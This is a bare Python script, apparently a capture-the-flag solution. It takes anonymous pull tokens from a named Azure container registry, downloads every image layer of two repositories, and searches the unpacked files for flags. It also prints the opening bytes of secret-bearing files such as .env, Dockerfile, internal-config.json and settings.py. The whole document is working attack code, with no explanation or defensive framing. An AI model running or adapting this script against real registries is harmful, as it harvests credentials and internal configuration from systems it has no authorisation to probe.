import urllib.request,urllib.error,json,io,tarfile,os
A="crtblplatprodx3euoz.azurecr.io"
class SafeRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self,req,fp,code,msg,headers,newurl):
        r=super().redirect_request(req,fp,code,msg,headers,newurl)
        if r is not None: r.remove_header("Authorization")
        return r
OP=urllib.request.build_opener(SafeRedirect)
def get(url,hdr=None,opener=False):
    r=urllib.request.Request(url,headers=hdr or {})
    try:
        with (OP.open(r,timeout=90) if opener else urllib.request.urlopen(r,timeout=90)) as resp:
            return resp.status,resp.read()
    except urllib.error.HTTPError as e:
        return e.code,e.read()
    except Exception as e:
        return 0,repr(e).encode()
ACC="application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json"
for R in ["tebamoto-reporting-api","catalog-api"]:
    s,tb=get("https://%s/oauth2/token?service=%s&scope=repository:%s:pull"%(A,A,R))
    pt=json.loads(tb).get("access_token","") if s==200 else ""
    print("PULLTOK",R,s,bool(pt))
    if not pt: continue
    H={"Authorization":"Bearer "+pt,"Accept":ACC}
    s,mb=get("https://%s/v2/%s/manifests/latest"%(A,R),H)
    if s!=200: print("MANIFEST",R,s); continue
    m=json.loads(mb)
    subs=[x["digest"] for x in m.get("manifests",[])] or ["latest"]
    for D in subs:
        s2,cb=get("https://%s/v2/%s/manifests/%s"%(A,R,D),H)
        if s2!=200: continue
        for x in json.loads(cb).get("layers",[]):
            LD=x["digest"]
            s3,blob=get("https://%s/v2/%s/blobs/%s"%(A,R,LD),{"Authorization":"Bearer "+pt},opener=True)
            print("LAYER",R,LD,s3,len(blob))
            if s3!=200: continue
            try:
                tf=tarfile.open(fileobj=io.BytesIO(blob),mode="r:*")
                for mem in tf.getmembers():
                    if not mem.isfile(): continue
                    try: d=tf.extractfile(mem).read()
                    except Exception: continue
                    low=d.lower()
                    if b"flag{" in low:
                        for line in d.split(b"\n"):
                            if b"flag{" in line.lower(): print("   FLAG",mem.name,line[:400])
                    if mem.name.endswith(("app.py","Dockerfile",".env","internal-config.json","entrypoint.sh","settings.py","config.py")) or mem.name.endswith(".txt"):
                        print("   FILE",mem.name,d[:500])
            except Exception as e:
                print("   TARERR",repr(e)[:120])
